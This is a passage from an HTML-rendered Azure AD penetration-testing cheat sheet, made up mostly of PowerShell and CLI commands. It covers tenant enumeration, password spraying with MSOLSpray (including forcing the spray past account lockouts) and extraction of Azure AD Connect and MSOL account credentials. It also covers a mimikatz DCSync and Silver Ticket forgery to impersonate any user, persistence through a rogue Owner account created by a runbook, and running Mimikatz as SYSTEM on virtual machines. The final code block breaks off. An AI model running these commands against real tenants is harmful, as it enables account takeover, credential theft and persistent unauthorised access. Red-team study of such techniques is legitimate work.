$ pip install roadrecon
$ roadrecon auth [-h] [-u USERNAME] [-p PASSWORD] [-t TENANT] [-c CLIENT] [--as-app] [--device-code] [--access-token ACCESS_TOKEN] [--refresh-token REFRESH_TOKEN] [-f TOKENFILE] [--tokens-stdout]
$ roadrecon gather [-h] [-d DATABASE] [-f TOKENFILE] [--tokens-stdin] [--mfa]
$ roadrecon dump
$ roadrecon gui
</pre></td></tr></tbody></table></code></div></div>

<p>Can be used in BloodHound using the fork : https://github.com/dirkjanm/BloodHound-AzureAD</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre></td><td class="rouge-code"><pre><span class="n">PS</span><span class="w"> </span><span class="nx">C:\</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">git</span><span class="w"> </span><span class="nx">clone</span><span class="w"> </span><span class="nx">https://github.com/adrecon/AzureADRecon.git</span><span class="w">
</span><span class="n">PS</span><span class="w"> </span><span class="nx">C:\</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Install-Module</span><span class="w"> </span><span class="nt">-Name</span><span class="w"> </span><span class="nx">AzureAD</span><span class="w">
</span><span class="n">PS</span><span class="w"> </span><span class="nx">C:\</span><span class="err">&gt;</span><span class="w"> </span><span class="o">.</span><span class="nx">\AzureADRecon.ps1</span><span class="w">

</span><span class="n">or</span><span class="w">

</span><span class="n">PS</span><span class="w"> </span><span class="nx">C:\</span><span class="err">&gt;</span><span class="w"> </span><span class="nv">$username</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"username@fqdn"</span><span class="w">
</span><span class="n">PS</span><span class="w"> </span><span class="nx">C:\</span><span class="err">&gt;</span><span class="w"> </span><span class="nv">$passwd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ConvertTo-SecureString</span><span class="w"> </span><span class="s2">"PlainTextPassword"</span><span class="w"> </span><span class="nt">-AsPlainText</span><span class="w"> </span><span class="nt">-Force</span><span class="w">
</span><span class="n">PS</span><span class="w"> </span><span class="nx">C:\</span><span class="err">&gt;</span><span class="w"> </span><span class="nv">$creds</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nx">System.Management.Automation.PSCredential</span><span class="w"> </span><span class="p">(</span><span class="nv">$username</span><span class="p">,</span><span class="w"> </span><span class="nv">$passwd</span><span class="p">)</span><span class="w">
</span><span class="n">PS</span><span class="w"> </span><span class="nx">C:\</span><span class="err">&gt;</span><span class="w"> </span><span class="o">.</span><span class="nx">\AzureADRecon.ps1</span><span class="w"> </span><span class="nt">-Credential</span><span class="w"> </span><span class="nv">$creds</span><span class="w">

</span><span class="n">PS</span><span class="w"> </span><span class="nx">C:\</span><span class="err">&gt;</span><span class="o">.</span><span class="nx">\AzureADRecon.ps1</span><span class="w"> </span><span class="nt">-GenExcel</span><span class="w"> </span><span class="nx">C:\AzureADRecon-Report-</span><span class="err">&lt;</span><span class="nx">timestamp</span><span class="err">&gt;</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<p>Stormspotter,  graphing Azure and Azure Active Directory objects</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre></td><td class="rouge-code"><pre><span class="err">$</span><span class="w"> </span><span class="n">docker</span><span class="w"> </span><span class="nx">run</span><span class="w"> </span><span class="nt">--name</span><span class="w"> </span><span class="nx">stormspotter</span><span class="w"> </span><span class="nt">-p7474</span><span class="p">:</span><span class="nx">7474</span><span class="w"> </span><span class="nt">-p7687</span><span class="p">:</span><span class="nx">7687</span><span class="w"> </span><span class="nt">-d</span><span class="w"> </span><span class="nt">--env</span><span class="w"> </span><span class="nx">NEO4J_AUTH</span><span class="o">=</span><span class="n">neo4j/</span><span class="p">[</span><span class="n">password</span><span class="p">]</span><span class="w"> </span><span class="nx">neo4j:3.5.18</span><span class="w">
</span><span class="n">git</span><span class="w"> </span><span class="nx">clone</span><span class="w"> </span><span class="nx">https://github.com/Azure/Stormspotter</span><span class="w">
</span><span class="n">cd</span><span class="w"> </span><span class="nx">Stormspotter</span><span class="w">
</span><span class="n">pipenv</span><span class="w"> </span><span class="nx">install</span><span class="w"> </span><span class="o">.</span><span class="w">
</span><span class="n">stormspotter</span><span class="w"> </span><span class="nt">--cli</span><span class="w">
</span><span class="n">stormdash</span><span class="w"> </span><span class="nt">-dbu</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">neo4j-user</span><span class="err">&gt;</span><span class="w"> </span><span class="nt">-dbp</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">neo4j-pass</span><span class="err">&gt;</span><span class="w">
</span><span class="n">Browse</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">http://127.0.0.1:8050</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">interact</span><span class="w"> </span><span class="nx">with</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">graph.</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<p>Other interesting commands to enumerate Azure AD.</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
</pre></td><td class="rouge-code"><pre><span class="c"># Azure AD powershell module</span><span class="w">
</span><span class="n">Get-AzureADDirectoryRole</span><span class="w">

</span><span class="c"># MSOnline powershell module</span><span class="w">
</span><span class="n">Get-MsolRole</span><span class="w">
</span><span class="nx">Get-MsolRoleMember</span><span class="w"> </span><span class="nt">-RoleObjectId</span><span class="w"> </span><span class="nx">XXXXXXXXXX-XXXX-XXXX...</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">fl</span><span class="w">

</span><span class="c">#Connect to Azure AD using Powershell</span><span class="w">
</span><span class="n">install-module</span><span class="w"> </span><span class="nx">azuread</span><span class="w">
</span><span class="n">import-module</span><span class="w"> </span><span class="nx">azuread</span><span class="w">
</span><span class="n">get-module</span><span class="w"> </span><span class="nx">azuread</span><span class="w">
</span><span class="n">connect-azuread</span><span class="w">

</span><span class="c"># Get list of users with role global admins# Note that role =! group</span><span class="w">
</span><span class="nv">$role</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Get-AzureADDirectoryRole</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Where-Object</span><span class="w"> </span><span class="p">{</span><span class="bp">$_</span><span class="o">.</span><span class="nf">displayName</span><span class="w"> </span><span class="o">-eq</span><span class="w"> </span><span class="s1">'Company Administrator'</span><span class="p">}</span><span class="w">
</span><span class="n">Get-AzureADDirectoryRoleMember</span><span class="w"> </span><span class="nt">-ObjectId</span><span class="w"> </span><span class="nv">$role</span><span class="o">.</span><span class="nf">ObjectId</span><span class="w">

</span><span class="c"># Get all groups and an example using filter</span><span class="w">
</span><span class="n">Get-AzureADGroup</span><span class="w">
</span><span class="nx">Get-AzureADGroup</span><span class="w"> </span><span class="nt">-Filter</span><span class="w"> </span><span class="s2">"DisplayName eq 'Intune Administrators'"</span><span class="w">

</span><span class="c"># Get Azure AD policy</span><span class="w">
</span><span class="n">Get-AzureADPolicy</span><span class="w">

</span><span class="c"># Get Azure AD roles with some examples</span><span class="w">
</span><span class="n">Get-AzureADDirectoryRole</span><span class="w">
</span><span class="nx">Get-AzureADDirectoryRole</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Where-Object</span><span class="w"> </span><span class="p">{</span><span class="bp">$_</span><span class="o">.</span><span class="nf">displayName</span><span class="w"> </span><span class="o">-eq</span><span class="w"> </span><span class="s1">'Security Reader'</span><span class="p">}</span><span class="w">
</span><span class="n">Get-AzureADDirectoryRoleTemplate</span><span class="w">

</span><span class="c"># Get Azure AD SPNs</span><span class="w">
</span><span class="n">Get-AzureADServicePrincipal</span><span class="w">

</span><span class="c"># Log in using Azure CLI (this is not powershell)</span><span class="w">
</span><span class="n">az</span><span class="w"> </span><span class="nx">login</span><span class="w"> </span><span class="nt">--allow-no-subscriptions</span><span class="w">

</span><span class="c"># Get member list using Azure CLI</span><span class="w">
</span><span class="n">az</span><span class="w"> </span><span class="nx">ad</span><span class="w"> </span><span class="nx">group</span><span class="w"> </span><span class="nx">member</span><span class="w"> </span><span class="nx">list</span><span class="w"> </span><span class="nt">--output</span><span class="o">=</span><span class="n">json</span><span class="w"> </span><span class="nt">--query</span><span class="o">=</span><span class="s1">'[].{Created:createdDateTime,UPN:userPrincipalName,Name:displayName,Title:jobTitle,Department:department,Email:mail,UserId:mailNickname,Phone:telephoneNumber,Mobile:mobile,Enabled:accountEnabled}'</span><span class="w"> </span><span class="nt">--group</span><span class="o">=</span><span class="s1">'Company Administrators'</span><span class="w">

</span><span class="c"># Get user list</span><span class="w">
</span><span class="n">az</span><span class="w"> </span><span class="nx">ad</span><span class="w"> </span><span class="nx">user</span><span class="w"> </span><span class="nx">list</span><span class="w"> </span><span class="nt">--output</span><span class="o">=</span><span class="n">json</span><span class="w"> </span><span class="nt">--query</span><span class="o">=</span><span class="s1">'[].{Created:createdDateTime,UPN:userPrincipalName,Name:displayName,Title:jobTitle,Department:department,Email:mail,UserId:mailNickname,Phone:telephoneNumber,Mobile:mobile,Enabled:accountEnabled}'</span><span class="w"> </span><span class="nt">--upn</span><span class="o">=</span><span class="s1">'username@domain.com'</span><span class="w">

</span><span class="c">#PS script to get array of users / roles</span><span class="w">
</span><span class="nv">$roleUsers</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">@()</span><span class="w"> 
</span><span class="nv">$roles</span><span class="o">=</span><span class="n">Get-AzureADDirectoryRole</span><span class="w">
 
</span><span class="kr">ForEach</span><span class="p">(</span><span class="nv">$role</span><span class="w"> </span><span class="kr">in</span><span class="w"> </span><span class="nv">$roles</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
  </span><span class="nv">$users</span><span class="o">=</span><span class="n">Get-AzureADDirectoryRoleMember</span><span class="w"> </span><span class="nt">-ObjectId</span><span class="w"> </span><span class="nv">$role</span><span class="o">.</span><span class="nf">ObjectId</span><span class="w">
  </span><span class="nx">ForEach</span><span class="p">(</span><span class="nv">$user</span><span class="w"> </span><span class="kr">in</span><span class="w"> </span><span class="nv">$users</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
    </span><span class="n">write-host</span><span class="w"> </span><span class="nv">$role</span><span class="o">.</span><span class="nf">DisplayName</span><span class="p">,</span><span class="nv">$user</span><span class="o">.</span><span class="nf">DisplayName</span><span class="w">
    </span><span class="nv">$obj</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nx">PSCustomObject</span><span class="w">
    </span><span class="nv">$obj</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Add-Member</span><span class="w"> </span><span class="nt">-type</span><span class="w"> </span><span class="nx">NoteProperty</span><span class="w"> </span><span class="nt">-name</span><span class="w"> </span><span class="nx">RoleName</span><span class="w"> </span><span class="nt">-value</span><span class="w"> </span><span class="s2">""</span><span class="w">
    </span><span class="nv">$obj</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Add-Member</span><span class="w"> </span><span class="nt">-type</span><span class="w"> </span><span class="nx">NoteProperty</span><span class="w"> </span><span class="nt">-name</span><span class="w"> </span><span class="nx">UserDisplayName</span><span class="w"> </span><span class="nt">-value</span><span class="w"> </span><span class="s2">""</span><span class="w">
    </span><span class="nv">$obj</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Add-Member</span><span class="w"> </span><span class="nt">-type</span><span class="w"> </span><span class="nx">NoteProperty</span><span class="w"> </span><span class="nt">-name</span><span class="w"> </span><span class="nx">IsAdSynced</span><span class="w"> </span><span class="nt">-value</span><span class="w"> </span><span class="nx">false</span><span class="w">
    </span><span class="nv">$obj</span><span class="o">.</span><span class="nf">RoleName</span><span class="o">=</span><span class="nv">$role</span><span class="o">.</span><span class="nf">DisplayName</span><span class="w">
    </span><span class="nv">$obj</span><span class="o">.</span><span class="nf">UserDisplayName</span><span class="o">=</span><span class="nv">$user</span><span class="o">.</span><span class="nf">DisplayName</span><span class="w">
    </span><span class="nv">$obj</span><span class="o">.</span><span class="nf">IsAdSynced</span><span class="o">=</span><span class="nv">$user</span><span class="o">.</span><span class="nf">DirSyncEnabled</span><span class="w"> </span><span class="o">-eq</span><span class="w"> </span><span class="bp">$true</span><span class="w">
    </span><span class="nv">$roleUsers</span><span class="o">+=</span><span class="nv">$obj</span><span class="w">
  </span><span class="p">}</span><span class="w">
</span><span class="p">}</span><span class="w">
</span><span class="nv">$roleUsers</span><span class="w">

</span><span class="c">### Enumeration using Microburst</span><span class="w">
</span><span class="n">git</span><span class="w"> </span><span class="nx">clone</span><span class="w"> </span><span class="nx">https://github.com/NetSPI/MicroBurst/blob/master/Get-AzureADDomainInfo.ps1</span><span class="w">
</span><span class="n">Import-Module</span><span class="w"> </span><span class="o">.</span><span class="nx">\MicroBurst.psm1</span><span class="w">

</span><span class="c"># Anonymous enumeration</span><span class="w">
</span><span class="n">Invoke-EnumerateAzureBlobs</span><span class="w"> </span><span class="nt">-Base</span><span class="w"> </span><span class="nx">company</span><span class="w">
</span><span class="n">Invoke-EnumerateAzureSubDomains</span><span class="w"> </span><span class="nt">-base</span><span class="w"> </span><span class="nx">company</span><span class="w"> </span><span class="nt">-verbose</span><span class="w">

</span><span class="c"># Authencticated enumeration</span><span class="w">
</span><span class="n">Get-AzureADDomainInfo</span><span class="w">
</span><span class="nx">Get-AzureDomainInfo</span><span class="w"> </span><span class="nt">-folder</span><span class="w"> </span><span class="nx">MicroBurst</span><span class="w"> </span><span class="nt">-VerboseGet-MSOLDomainInfo</span><span class="w">
</span><span class="n">Get-MSOLDomainInfo</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<p>With Microsoft, if you are using any cloud services (Office 365, Exchange Online, etc) with Active Directory (on-prem or in Azure) then an attacker is one credential away from being able to leak your entire Active Directory structure thanks to Azure AD.</p>

<ol>
  <li>Authenticate to your webmail portal (i.e. https://webmail.domain.com/)</li>
  <li>Change your browser URL to: https://azure.microsoft.com/</li>
  <li>Pick the account from the active sessions</li>
  <li>Select Azure Active Directory and enjoy!</li>
</ol>

<h2 id="azure-ad---password-spray">Azure AD - Password Spray</h2>

<blockquote>
  <p>Default lockout policy of 10 failed attempts, locking out an account for 60 seconds</p>
</blockquote>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre></td><td class="rouge-code"><pre><span class="n">git</span><span class="w"> </span><span class="nx">clone</span><span class="w"> </span><span class="nx">https://github.com/dafthack/MSOLSpray</span><span class="w">
</span><span class="n">Import-Module</span><span class="w"> </span><span class="o">.</span><span class="nx">\MSOLSpray.ps1</span><span class="w">
</span><span class="n">Invoke-MSOLSpray</span><span class="w"> </span><span class="nt">-UserList</span><span class="w"> </span><span class="o">.</span><span class="nx">\userlist.txt</span><span class="w"> </span><span class="nt">-Password</span><span class="w"> </span><span class="nx">Winter2020</span><span class="w">
</span><span class="n">Invoke-MSOLSpray</span><span class="w"> </span><span class="nt">-UserList</span><span class="w"> </span><span class="o">.</span><span class="nx">\users.txt</span><span class="w"> </span><span class="nt">-Password</span><span class="w"> </span><span class="nx">d0ntSprayme</span><span class="o">!</span><span class="w">

</span><span class="c"># UserList  - UserList file filled with usernames one-per-line in the format "user@domain.com"</span><span class="w">
</span><span class="c"># Password  - A single password that will be used to perform the password spray.</span><span class="w">
</span><span class="c"># OutFile   - A file to output valid results to.</span><span class="w">
</span><span class="c"># Force     - Forces the spray to continue and not stop when multiple account lockouts are detected.</span><span class="w">
</span><span class="c"># URL       - The URL to spray against. Potentially useful if pointing at an API Gateway URL generated with something like FireProx to randomize the IP address you are authenticating from.</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<h2 id="azure-ad---convert-guid-to-sid">Azure AD - Convert GUID to SID</h2>

<p>The user’s AAD id is translated to SID by concatenating <code class="language-plaintext highlighter-rouge">"S-1–12–1-"</code> to the decimal representation of each section of the AAD Id.</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="n">GUID:</span><span class="w"> </span><span class="p">[</span><span class="n">base16</span><span class="p">(</span><span class="n">a1</span><span class="p">)]</span><span class="n">-</span><span class="p">[</span><span class="n">base16</span><span class="p">(</span><span class="n">a2</span><span class="p">)]</span><span class="n">-</span><span class="p">[</span><span class="w"> </span><span class="n">base16</span><span class="p">(</span><span class="n">a3</span><span class="p">)]</span><span class="n">-</span><span class="p">[</span><span class="n">base16</span><span class="p">(</span><span class="n">a4</span><span class="p">)]</span><span class="w">
</span><span class="n">SID:</span><span class="w"> </span><span class="nx">S-1</span><span class="err">–</span><span class="nx">12</span><span class="err">–</span><span class="nx">1-</span><span class="p">[</span><span class="n">base10</span><span class="p">(</span><span class="n">a1</span><span class="p">)]</span><span class="n">-</span><span class="p">[</span><span class="w"> </span><span class="n">base10</span><span class="p">(</span><span class="n">a2</span><span class="p">)]</span><span class="n">-</span><span class="p">[</span><span class="w"> </span><span class="n">base10</span><span class="p">(</span><span class="n">a3</span><span class="p">)]</span><span class="n">-</span><span class="p">[</span><span class="w"> </span><span class="n">base10</span><span class="p">(</span><span class="n">a4</span><span class="p">)]</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<p>For example, the representation of <code class="language-plaintext highlighter-rouge">6aa89ecb-1f8f-4d92–810d-b0dce30b6c82</code> is <code class="language-plaintext highlighter-rouge">S-1–12–1–1789435595–1301421967–3702525313–2188119011</code></p>

<h2 id="azure-ad---sign-in-with-a-service-principal">Azure AD - Sign in with a service principal</h2>

<p>https://docs.microsoft.com/en-us/powershell/azure/authenticate-azureps?view=azps-3.3.0&amp;viewFallbackFrom=azurermps-6.5.0#sign-in-with-a-service-principal</p>

<p>:warning: Service Principal accounts do not require MFA. Anyone with control over Service Principals can assign credentials to them and potentially escalate privileges.</p>

<ul>
  <li>
    <p>Password based authentication</p>

    <div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre><span class="w">  </span><span class="c"># Use the service principal ID for the username</span><span class="w">
  </span><span class="nv">$pscredential</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Get-Credential</span><span class="w">
  </span><span class="nx">Connect-AzAccount</span><span class="w"> </span><span class="nt">-ServicePrincipal</span><span class="w"> </span><span class="nt">-Credential</span><span class="w"> </span><span class="nv">$pscredential</span><span class="w"> </span><span class="nt">-Tenant</span><span class="w"> </span><span class="nv">$tenantId</span><span class="w">
</span></pre></td></tr></tbody></table></code></div>    </div>
  </li>
  <li>
    <p>Certificate based authentication</p>

    <div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="w">  </span><span class="n">Connect-AzAccount</span><span class="w"> </span><span class="nt">-ApplicationId</span><span class="w"> </span><span class="nv">$appId</span><span class="w"> </span><span class="nt">-Tenant</span><span class="w"> </span><span class="nv">$tenantId</span><span class="w"> </span><span class="nt">-CertificateThumbprint</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">thumbprint</span><span class="err">&gt;</span><span class="w">
</span></pre></td></tr></tbody></table></code></div>    </div>
  </li>
</ul>

<h2 id="azure-ad-connect---password-extraction">Azure AD Connect - Password extraction</h2>

<p>Credentials in AD Sync : C:\Program Files\Microsoft Azure AD Sync\Data\ADSync.mdf</p>

<div class="table-wrapper"><table>
  <thead>
    <tr>
      <th>Tool</th>
      <th>Requires code execution on target</th>
      <th>DLL dependencies</th>
      <th>Requires MSSQL locally</th>
      <th>Requires python locally</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>ADSyncDecrypt</td>
      <td>Yes</td>
      <td>Yes</td>
      <td>No</td>
      <td>No</td>
    </tr>
    <tr>
      <td>ADSyncGather</td>
      <td>Yes</td>
      <td>No</td>
      <td>No</td>
      <td>Yes</td>
    </tr>
    <tr>
      <td>ADSyncQuery</td>
      <td>No (network RPC calls only)</td>
      <td>No</td>
      <td>Yes</td>
      <td>Yes</td>
    </tr>
  </tbody>
</table></div>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="n">git</span><span class="w"> </span><span class="nx">clone</span><span class="w"> </span><span class="nx">https://github.com/fox-it/adconnectdump</span><span class="w">
</span><span class="c"># DCSync with AD Sync account</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<h2 id="azure-ad-connect---msol-accounts-password-and-dcsync">Azure AD Connect - MSOL Account’s password and DCSync</h2>

<p>You can perform <strong>DCSync</strong> attack using the MSOL account.</p>

<p>Prerequisite:</p>
<ul>
  <li>Compromise a server with Azure AD Connect service</li>
  <li>Access to ADSyncAdmins or local Administrators groups</li>
</ul>

<p>Use the script <strong>azuread_decrypt_msol.ps1</strong> from @xpn to recover the decrypted password for the MSOL account:</p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">azuread_decrypt_msol.ps1</code>: AD Connect Sync Credential Extract POC https://gist.github.com/xpn/0dc393e944d8733e3c63023968583545</li>
  <li><code class="language-plaintext highlighter-rouge">azuread_decrypt_msol_v2.ps1</code>: Updated method of dumping the MSOL service account (which allows a DCSync) used by Azure AD Connect Sync https://gist.github.com/xpn/f12b145dba16c2eebdd1c6829267b90c</li>
</ul>

<p>Now you can use the retrieved credentials for the MSOL Account to launch a DCSync attack.</p>

<h2 id="azure-ad-connect---seamless-single-sign-on-silver-ticket">Azure AD Connect - Seamless Single Sign On Silver Ticket</h2>

<blockquote>
  <p>Anyone who can edit properties of the AZUREADSSOACCS$ account can impersonate any user in Azure AD using Kerberos (if no MFA)</p>
</blockquote>

<p>:warning: The password of the AZUREADSSOACC account never changes.</p>

<p>Using <a href="https://autologon.microsoftazuread-sso.com/">https://autologon.microsoftazuread-sso.com/</a> to convert Kerberos tickets to SAML and JWT for Office 365 &amp; Azure</p>

<ol>
  <li>NTLM password hash of the AZUREADSSOACC account, e.g. <code class="language-plaintext highlighter-rouge">f9969e088b2c13d93833d0ce436c76dd</code>.
    <div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="w"> </span><span class="n">mimikatz.exe</span><span class="w"> </span><span class="s2">"lsadump::dcsync /user:AZUREADSSOACC$"</span><span class="w"> </span><span class="nx">exit</span><span class="w">
</span></pre></td></tr></tbody></table></code></div>    </div>
  </li>
  <li>AAD logon name of the user we want to impersonate, e.g. <code class="language-plaintext highlighter-rouge">elrond@contoso.com</code>. This is typically either his userPrincipalName or mail attribute from the on-prem AD.</li>
  <li>SID of the user we want to impersonate, e.g. <code class="language-plaintext highlighter-rouge">S-1-5-21-2121516926-2695913149-3163778339-1234</code>.</li>
  <li>Create the Silver Ticket and inject it into Kerberos cache:
    <div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre><span class="w"> </span><span class="n">mimikatz.exe</span><span class="w"> </span><span class="s2">"kerberos::golden /user:elrond
 /sid:S-1-5-21-2121516926-2695913149-3163778339 /id:1234
 /domain:contoso.local /rc4:f9969e088b2c13d93833d0ce436c76dd
 /target:aadg.windows.net.nsatc.net /service:HTTP /ptt"</span><span class="w"> </span><span class="nx">exit</span><span class="w">
</span></pre></td></tr></tbody></table></code></div>    </div>
  </li>
  <li>Launch Mozilla Firefox</li>
  <li>Go to about:config and set the <code class="language-plaintext highlighter-rouge">network.negotiate-auth.trusted-uris preference</code> to value <code class="language-plaintext highlighter-rouge">https://aadg.windows.net.nsatc.net,https://autologon.microsoftazuread-sso.com</code></li>
  <li>Navigate to any web application that is integrated with our AAD domain. Fill in the user name, while leaving the password field empty.</li>
</ol>

<h2 id="azure-ad---adfs-federation-server-cloud-kerberos">Azure AD - ADFS Federation Server ~Cloud Kerberos</h2>

<p>Discover Federation Servers</p>
<ul>
  <li>adfs</li>
  <li>auth</li>
  <li>fs</li>
  <li>okta</li>
  <li>ping</li>
  <li>sso</li>
  <li>sts</li>
</ul>

<p>OWA Version Discovery : autodiscover.domain.com</p>

<h2 id="azure-ad---persistence-via-automation-accounts">Azure AD - Persistence via Automation accounts</h2>

<ul>
  <li>Create a new Automation Account
    <ul>
      <li>“Create Azure Run As account”: Yes</li>
    </ul>
  </li>
  <li>Import a new runbook that creates an AzureAD user with Owner permissions for the subscription*
    <ul>
      <li>Sample runbook for this Blog located here – https://github.com/NetSPI/MicroBurst</li>
      <li>Publish the runbook</li>
      <li>Add a webhook to the runbook</li>
    </ul>
  </li>
  <li>Add the AzureAD module to the Automation account
    <ul>
      <li>Update the Azure Automation Modules</li>
    </ul>
  </li>
  <li>Assign “User Administrator” and “Subscription Owner” rights to the automation account</li>
  <li>Eventually lose your access…</li>
  <li>Trigger the webhook with a post request to create the new user
    <div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre><span class="w">  </span><span class="nv">$uri</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"https://s15events.azure-automation.net/webhooks?token=h6[REDACTED]%3d"</span><span class="w">
  </span><span class="nv">$AccountInfo</span><span class="w">  </span><span class="o">=</span><span class="w"> </span><span class="p">@(@{</span><span class="nx">RequestBody</span><span class="o">=</span><span class="p">@{</span><span class="nx">Username</span><span class="o">=</span><span class="s2">"BlogDemoUser"</span><span class="p">;</span><span class="nx">Password</span><span class="o">=</span><span class="s2">"Password123"</span><span class="p">}})</span><span class="w">
  </span><span class="nv">$body</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ConvertTo-Json</span><span class="w"> </span><span class="nt">-InputObject</span><span class="w"> </span><span class="nv">$AccountInfo</span><span class="w">
  </span><span class="nv">$response</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Invoke-WebRequest</span><span class="w"> </span><span class="nt">-Method</span><span class="w"> </span><span class="nx">Post</span><span class="w"> </span><span class="nt">-Uri</span><span class="w"> </span><span class="nv">$uri</span><span class="w"> </span><span class="nt">-Body</span><span class="w"> </span><span class="nv">$body</span><span class="w">
</span></pre></td></tr></tbody></table></code></div>    </div>
  </li>
</ul>

<h2 id="azure-vm---execute-command-as-nt-system-with-contributor-right">Azure VM - Execute command as NT SYSTEM with Contributor right</h2>

<blockquote>
  <p>Allow anyone with “Contributor” rights to run PowerShell scripts on any Azure VM in a subscription as NT Authority\System</p>
</blockquote>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre><span class="n">PS</span><span class="w"> </span><span class="nx">C:\</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Get-AzureRmVM</span><span class="w"> </span><span class="nt">-status</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">where</span><span class="w"> </span><span class="p">{</span><span class="bp">$_</span><span class="o">.</span><span class="nf">PowerState</span><span class="w"> </span><span class="o">-EQ</span><span class="w"> </span><span class="s2">"VM running"</span><span class="p">}</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">select</span><span class="w"> </span><span class="nx">ResourceGroupName</span><span class="p">,</span><span class="nx">Name</span><span class="w">

</span><span class="n">ResourceGroupName</span><span class="w">    </span><span class="nx">Name</span><span class="w">       
</span><span class="o">-----------------</span><span class="w">    </span><span class="o">----</span><span class="w">       
</span><span class="n">TESTRESOURCES</span><span class="w">        </span><span class="nx">Remote-Test</span><span class="w">
</span><span class="n">PS</span><span class="w"> </span><span class="nx">C:\</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Invoke-AzureRmVMRunCommand</span><span class="w"> </span><span class="nt">-ResourceGroupName</span><span class="w"> </span><span class="nx">TESTRESOURCES</span><span class="w"> </span><span class="nt">-VMName</span><span class="w"> </span><span class="nx">Remote-Test</span><span class="w"> </span><span class="nt">-CommandId</span><span class="w"> </span><span class="nx">RunPowerShellScript</span><span class="w"> </span><span class="nt">-ScriptPath</span><span class="w"> </span><span class="nx">Mimikatz.ps1</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<p>Against the whole subscription using MicroBurst.ps1</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="n">Import-module</span><span class="w"> </span><span class="nx">MicroBurst.psm1</span><span class="w">
